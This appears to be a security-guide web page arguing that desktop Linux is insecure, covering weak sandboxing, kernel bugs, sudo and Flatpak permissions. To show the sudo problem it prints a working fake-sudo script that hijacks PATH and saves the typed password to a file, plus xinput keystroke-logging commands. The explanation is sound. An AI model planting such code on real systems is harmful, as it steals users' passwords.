  <h1>Linux</h1>

  <p>
    Due to inevitable pedanticism, "Linux" in this article refers to a standard Linux or GNU/Linux distro.
  </p>

  <h2 id="linux-insecurity"><a href="#linux-insecurity">Linux (in)security</a></h2>

  <p>
    There is a common assumption that Linux is a very secure operating system. This is very far from the truth for
    various different reasons. <br>
    <br>
    There is no strong sandboxing in the standard desktop. This means all applications have access to each otherâ€™s data
    and can snoop on your personal information. Most programs are written in memory unsafe languages such as C or C++
    which has been the cause of <a
      href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">the majority of
      discovered security vulnerabilities</a> and modern exploit mitigations such as Control-Flow Integrity are not
    widely used. <br>
    <br>
    The kernel is also very lacking in security. It is a monolithic kernel written entirely in a memory unsafe language
    and has hundreds of bugs, many being security vulnerabilities, <a
      href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">found
      each <i>month</i></a>. In fact, there are so many bugs being found in the kernel, developers canâ€™t keep up which
    results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
    The kernel is also <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">decades behind in exploit
      mitigations</a> and many kernel developers simply <a
      href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
      care enough</a>. <br>
    <br>
    On ordinary desktops, a compromised non-root user account with access to <code>sudo</code> is <a
    href="https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation">almost equal to full
    root compromise</a> as there are too many ways for an attacker to retrieve the sudo password. Usually, the standard user
    is part of group <code>sudo</code> which makes this a massive issue and makes a sudo password almost security
    theater. For example, the attacker can exploit the plethora of keylogging opportunities such as <a
      href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Xâ€™s lack of GUI
      isolation</a>, the <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many infoleaks in
      <code>/proc</code></a>, use <a href="https://github.com/Aishou/wayland-keylogger"><code>LD_PRELOAD</code> to hook
      into every process</a> and so much more. Even if we mitigate every single way to log keystrokes, the attacker can
    just setup their own fake sudo program to grab the user password. <br>
    <br>
    This is all it takes to get your <code>sudo</code> password:
    <pre><code>cat &lt;&lt;\EOF > /tmp/sudo
#!/bin/bash
if [[ "${@}" = "" ]]; then
  /usr/bin/sudo
else
  read -s -r -p "[sudo] password for ${USER}: " password
  echo "${password}" > /tmp/password
  echo -e "\nSorry, try again."
  /usr/bin/sudo ${@}
fi
EOF
chmod +x /tmp/sudo
export PATH="/tmp:${PATH}"</code></pre>
    <br>
    Or:
    <pre><code>xinput list # find your keyboard ID
xinput test id # replace "id" with the ID from the above command</code></pre>
    <br>
    etc. <br>
    <br>
    Now the attacker is just a <code>modprobe</code> away from full kernel privileges.
  </p>

  <h2 id="hardening"><a href="#hardening">"But I harden my system!"</a></h2>

  <p>
    Standard system hardening is not enough to fix any of these massive architectural security issues. Restricting a few
    minor things is not going to fix this. Likewise, a few common security features distros deploy by default is also
    not going to fix this. Just because your distro enables a MAC framework without creating a strict policy and still
    running most processes unconfined, doesn't mean you can escape from these. <br>
    <br>
    The hardening required for a reasonably secure Linux distro is far greater than people assume. You will need full
    system MAC policies, full verified boot (not just the kernel but the entire base system), a strong sandboxing
    architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty more.

  <h3 id="flatpak"><a href="#flatpak">Flatpak</a></h3>

  <p>
    Flatpak aims to sandbox applications but <a href="https://flatkill.org/">its sandboxing is very flawed</a>. It fully
    trusts the applications and allows them to specify their own policy. This means security is optional and apps can
    just choose not to be sufficiently sandboxed. <br>
    <br>
    Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with
    <code>filesystem=home</code> which is read-write access to the user's home directory, giving access to all of your
    personal files and allowing trivial escapes via writing to <code>~/.bashrc</code> or similar. <br>
    <br>
    Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, allowing easy
    escapes due to X11's lack of GUI isolation. Adding X11 sandboxing via a nested X11 server such as Xpra is easy but
    Flatpak developers refuse to acknowledge this and continue to claim <a
      href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">"X11 is impossible to
      secure"</a>. <br>
    <br>
    Even more examples of this is how Flatpak gives full access to directories such as <code>/sys</code> or
    <code>/proc</code> (kernel interfaces known for information leaks). <br>
    <br>
    <i>Another</i> example is how the seccomp filter <a
      href="https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693">
    only blacklists ~20 syscalls</a>.
